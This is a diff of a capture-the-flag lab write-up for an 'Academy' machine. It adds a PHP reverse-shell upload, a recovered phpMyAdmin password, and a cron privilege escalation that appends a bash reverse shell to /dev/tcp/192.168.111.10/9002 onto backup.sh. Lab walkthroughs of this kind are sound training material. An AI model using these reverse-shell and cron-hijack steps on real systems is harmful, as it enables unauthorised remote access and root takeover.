@@ -49,16 +49,31 @@ INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName
 ('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');
 ```
 Login Rum Ham: 10201321:student(MD5)
-Academy admin: Grimmie
+Academy admin: Grimmie (uses the same password )
 SQL Database admin: jdelta
 ### gobuster
 ```shell
 /academy              (Status: 301) [Size: 318] [--> http://192.168.111.11/academy/]
 /phpmyadmin           (Status: 301) [Size: 321] [--> http://192.168.111.11/phpmyadmin/]
 ```
+![profile-picture upload](images/academy_upload.png)
 
 # Exploitation
+Upload php-reverseshell and got Access
+Found backup.sh which is also in crontab (runing every minute)
+![](images/crontab.png)
 
+Linpeas:
+![](images/mysql_password.png)
+phpMyAdmin: grimmie:My_V3ryS3cur3_P4ss
+
+-> SSH Access
+
+Modify backup.sh:
+`echo "/bin/bash -i >& /dev/tcp/192.168.111.10/9002 0>&1" >> backup.sh`
+
+Got Root-Shell
 ---
 
 ### References & Further Research
+[Another PrivEsc: Linux chfn (SuSE 9.3/10)?](https://www.exploit-db.com/exploits/1299)
